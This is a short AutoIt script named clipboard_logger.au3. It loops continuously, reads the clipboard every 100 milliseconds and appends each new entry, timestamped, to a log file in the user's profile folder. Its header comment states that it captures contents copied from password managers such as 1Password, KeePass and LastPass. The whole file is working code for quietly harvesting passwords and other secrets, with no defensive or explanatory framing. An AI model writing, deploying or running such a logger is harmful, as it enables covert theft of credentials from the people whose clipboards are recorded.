; Script Name	: clipboard_logger.au3
; Author		: Craig Richards
; Created		: 25th January 2012
; Last Modified	:
; Version		: 1.0

; Modifications	:

; Description	: Will log all contents added to the clipboard, even if they use 1Passwd, Keypass, Lastpass etc

#Include <clipboard.au3>										; Include the Clipboard Header file
#Include <File.au3>												; Include the File Header file

$oldclip="" 													; Set the variable $oldclip to be blank
While 1 														; While True, so continually run
   $clip=_Clipboard_GetData()									; Sets the variable clip, which gets the contents of the clipboard
   If $clip <> "0" Then 										; If clip isn't zero then,
	  If $clip <> $oldclip Then									; Don't log the same clipboard text over and over, if nothing has come in in 100 milliseconds
		 _FileWriteLog(@UserProfileDir & "\clip.log", $clip)	; Write out to the clip.log file, this entry in timestamped.
		 $oldclip = $clip 										; Make oldclip the same as clip for this instance
	  EndIf 													; End the First IF Statement
   EndIf 														; End of the Second IF Statement
   Sleep(100) 													; Sleep for 100 Milliseconds
WEnd 															; End of the while loop